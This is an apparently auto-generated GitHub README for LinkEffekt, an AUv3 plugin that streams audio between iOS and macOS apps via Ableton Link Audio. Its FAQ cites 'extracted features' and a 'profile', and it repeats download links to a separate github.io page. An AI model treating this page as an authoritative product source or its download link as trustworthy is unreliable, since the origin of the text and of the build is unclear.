# LinkEffekt v2026 - audio streaming plugin 2026

> **LinkEffekt is an AUv3 audio streaming plugin for iOS and macOS that transfers audio between music apps via Ableton Link Audio, with local network and Online mode options in version 2026.**

[![Platform](https://img.shields.io/badge/Platform-iOS%2FmacOS-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/oliver-adamsntr6504/linkeffekt-link-audio-plugin?style=flat-square)](https://github.com/oliver-adamsntr6504/linkeffekt-link-audio-plugin)

---

<p align="center">
  <a href="https://oliver-adamsntr6504.github.io/linkeffekt-link-audio-plugin/">
    <img src="https://img.shields.io/badge/Download-LinkEffekt%20Latest-brightgreen?style=for-the-badge" alt="Download LinkEffekt">
  </a>
</p>

> **[Direct Download - LinkEffekt v2026](https://oliver-adamsntr6504.github.io/linkeffekt-link-audio-plugin/)**

---

[Download Latest Build](https://oliver-adamsntr6504.github.io/linkeffekt-link-audio-plugin/)

---

## Overview

LinkEffekt is designed for music setups where audio needs to travel smoothly between iOS and macOS apps. Its focus is AUv3 hosting and Ableton Link Audio, so the transfer path can stay aligned with the timing of your session or performance.

It targets users who work across Ableton Live, mobile music tools, and Mac production software. Because it offers both local network streaming and Online mode, you can choose the routing method that best fits the way your apps are connected.

---

## What it includes

- AUv3 audio streaming plugin for iOS and macOS
- Streams audio between iOS and Mac music apps
- Ableton Link Audio support for networked timing workflows
- Local network streaming for nearby devices and apps
- Online mode for internet-based audio streaming
- Beat-locked audio transfer for synchronized sessions
- Includes Send, Receive, and Receive Instrument plugins
- Designed to fit into music app and Ableton Live workflows

---

## Installation

1. Download the latest build from the project page:
   [Download Latest Build](https://oliver-adamsntr6504.github.io/linkeffekt-link-audio-plugin/)
2. Install or copy the plugin files into the appropriate AUv3 location for your system.
3. Open your host app or music app and load the LinkEffekt component you want to use.

If you are building from source, clone the repository and open it in your preferred development environment before running the project.

---

## Using LinkEffekt

A common setup flow is:

1. Start Ableton Link or your host app session.
2. Add **Send**, **Receive**, or **Receive Instrument** depending on your routing plan.
3. Choose whether you want local network streaming or Online mode.
4. Connect the source and destination apps on iOS or macOS.
5. Play audio and confirm that timing stays aligned with the beat.

Example workflow:

- Use **Send** to transmit audio from one app.
- Use **Receive** to capture the stream in another app.
- Use **Receive Instrument** when you want the receiving side to behave like an instrument input in your setup.

---

## Configuration

LinkEffekt setup varies based on the plugin variant and the host app in use. In most cases, connection and routing choices are made inside the AUv3 interface and then stored with the music app session.

If your host saves plugin state separately, make sure to save the project or preset after changing:

- streaming mode
- network target
- link timing behavior
- plugin selection

---

## Requirements

- iOS or macOS
- AUv3-compatible host or music app
- Ableton Link Audio support in the workflow
- Local network access for network streaming setups
- Internet access for Online mode
- Compatible music apps for sending or receiving audio

---

## FAQ

### What is LinkEffekt for?
It streams audio between music apps on iOS and macOS, while keeping timing centered on Ableton Link Audio.

### Which plugin types are included?
The profile lists **Send**, **Receive**, and **Receive Instrument** plugins.

### Does it support multiple connection styles?
Yes. The extracted features mention both **local network streaming** and **Online mode**.

### Where do I change settings?
Most settings are handled in the AUv3 plugin interface and saved through the host app or project state.

### What if audio is not connecting?
Check the host app, verify that the selected plugin matches your routing plan, and confirm whether you are using local network streaming or Online mode.

### Where can I get updates?
Use the project download page for the latest build:
[Download Latest Build](https://oliver-adamsntr6504.github.io/linkeffekt-link-audio-plugin/)

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
